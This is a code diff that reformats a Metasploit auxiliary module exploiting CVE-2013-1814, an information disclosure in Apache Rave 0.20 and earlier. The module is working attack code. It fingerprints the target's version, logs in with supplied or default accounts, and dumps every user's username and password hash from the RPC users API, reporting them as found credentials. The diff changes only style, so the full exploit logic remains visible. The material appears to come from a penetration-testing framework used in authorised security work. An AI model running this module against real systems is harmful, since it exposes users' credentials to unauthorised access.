@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,59 +7,56 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Apache Rave User Information Disclosure',
-      'Description'    => %q{
-        This module exploits an information disclosure in Apache Rave 0.20 and prior. The
-        vulnerability exists in the RPC API, which allows any authenticated user to
-        disclose information about all the users, including their password hashes. In order
-        to authenticate, the user can provide his own credentials. Also the default users
-        installed with Apache Rave 0.20 will be tried automatically. This module has been
-        successfully tested on Apache Rave 0.20.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Andreas Guth', # Vulnerability discovery and PoC
-          'juan vazquez' # Metasploit module
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '2013-1814' ],
-          [ 'OSVDB', '91235' ],
-          [ 'BID', '58455' ],
-          [ 'EDB', '24744']
-        ]
-    ))
+                      'Name'           => 'Apache Rave User Information Disclosure',
+                      'Description'    => %q(
+                        This module exploits an information disclosure in Apache Rave 0.20 and prior. The
+                        vulnerability exists in the RPC API, which allows any authenticated user to
+                        disclose information about all the users, including their password hashes. In order
+                        to authenticate, the user can provide his own credentials. Also the default users
+                        installed with Apache Rave 0.20 will be tried automatically. This module has been
+                        successfully tested on Apache Rave 0.20.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Andreas Guth', # Vulnerability discovery and PoC
+                          'juan vazquez' # Metasploit module
+                        ],
+                      'References'     =>
+                        [
+                          [ 'CVE', '2013-1814' ],
+                          [ 'OSVDB', '91235' ],
+                          [ 'BID', '58455' ],
+                          [ 'EDB', '24744']
+                        ]))
 
     register_options(
       [
         Opt::RPORT(8080),
         OptString.new('TARGETURI', [true, 'Path to Apache Rave Portal', '/portal']),
         OptString.new('USERNAME', [ false, 'Apache Rave Username' ]),
-        OptString.new('PASSWORD', [ false, 'Apache Rave Password' ]),
-      ], self.class)
+        OptString.new('PASSWORD', [ false, 'Apache Rave Password' ])
+      ], self.class
+    )
   end
 
   def login(username, password)
     uri = normalize_uri(target_uri.to_s, "j_spring_security_check")
 
-    res = send_request_cgi({
-      'uri'      => uri,
-      'method'   => 'POST',
-      'vars_post' => {
-        'j_password' => username,
-        'j_username' => password
-      }
-    })
+    res = send_request_cgi('uri' => uri,
+                           'method' => 'POST',
+                           'vars_post' => {
+                             'j_password' => username,
+                             'j_username' => password
+                           })
 
-    if res and res.code == 302 and res.headers['Location'] !~ /authfail/ and res.get_cookies =~ /JSESSIONID=(.*);/
-      return $1
+    if res && (res.code == 302) && res.headers['Location'] !~ /authfail/ && res.get_cookies =~ /JSESSIONID=(.*);/
+      return Regexp.last_match(1)
     else
       return nil
     end
@@ -67,21 +65,18 @@ class MetasploitModule < Msf::Auxiliary
   def disclose(cookie, offset)
     uri = normalize_uri(target_uri.to_s, "app", "api", "rpc", "users", "get")
 
-    res = send_request_cgi({
-      'uri'      => uri,
-      'method'   => 'GET',
-      'vars_get' => {
-        'offset' => "#{offset}"
-      },
-      'cookie' => "JSESSIONID=#{cookie}"
-    })
+    res = send_request_cgi('uri' => uri,
+                           'method'   => 'GET',
+                           'vars_get' => {
+                             'offset' => offset.to_s
+                           },
+                           'cookie' => "JSESSIONID=#{cookie}")
 
-    if res and res.code == 200 and res.headers['Content-Type'] =~ /application\/json/ and res.body =~ /resultSet/
+    if res && (res.code == 200) && res.headers['Content-Type'] =~ /application\/json/ && res.body =~ /resultSet/
       return res.body
     else
       return nil
     end
-
   end
 
   def setup
@@ -129,20 +124,16 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-
   def run
-
     print_status("#{rhost}:#{rport} - Fingerprinting...")
-    res = send_request_cgi({
-      'uri'      => normalize_uri(target_uri.to_s, "login"),
-      'method'   => 'GET',
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.to_s, "login"),
+                           'method' => 'GET')
 
-    if not res
+    if !res
       print_error("#{rhost}:#{rport} - No response, aborting...")
       return
-    elsif res.code == 200 and res.body =~ /<span>Apache Rave ([0-9\.]*)<\/span>/
-      version =$1
+    elsif (res.code == 200) && res.body =~ /<span>Apache Rave ([0-9\.]*)<\/span>/
+      version = Regexp.last_match(1)
       if version <= "0.20"
         print_good("#{rhost}:#{rport} - Apache Rave #{version} found. Vulnerable. Proceeding...")
       else
@@ -154,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     cookie = nil
-    unless datastore["USERNAME"].empty? or datastore["PASSWORD"].empty?
+    unless datastore["USERNAME"].empty? || datastore["PASSWORD"].empty?
       print_status("#{rhost}:#{rport} - Login with the provided credentials...")
       cookie = login(datastore["USERNAME"], datastore["PASSWORD"])
       if cookie.nil?
@@ -166,14 +157,14 @@ class MetasploitModule < Msf::Auxiliary
 
     if cookie.nil?
       print_status("#{rhost}:#{rport} - Login with default accounts...")
-      @default_accounts.each { |user, password|
+      @default_accounts.each do |user, password|
         print_status("#{rhost}:#{rport} - Login with the #{user} default account...")
         cookie = login(user, password)
         unless cookie.nil?
           print_good("#{rhost}:#{rport} - Login successful. Proceeding...")
           break
         end
-      }
+      end
     end
 
     if cookie.nil?
@@ -208,8 +199,8 @@ class MetasploitModule < Msf::Auxiliary
       print_status("#{rhost}:#{rport} - Information for offset #{offset} saved in: #{path}")
 
       print_status("#{rhost}:#{rport} - Recovering Hashes...")
-      json_info["result"]["resultSet"].each { |result|
-        print_good("#{rhost}:#{rport} - Found cred: #{result["username"]}:#{result["password"]}")
+      json_info["result"]["resultSet"].each do |result|
+        print_good("#{rhost}:#{rport} - Found cred: #{result['username']}:#{result['password']}")
         report_cred(
           ip: rhost,
           port: rport,
@@ -218,17 +209,13 @@ class MetasploitModule < Msf::Auxiliary
           password: result["password"],
           proof: user_data
         )
-      }
+      end
 
       page = json_info["result"]["currentPage"]
       total_pages = json_info["result"]["numberOfPages"]
-      offset = offset + json_info["result"]["pageSize"]
-      if page == total_pages
-        search = false
-      end
+      offset += json_info["result"]["pageSize"]
+      search = false if page == total_pages
 
     end
-
   end
-
 end
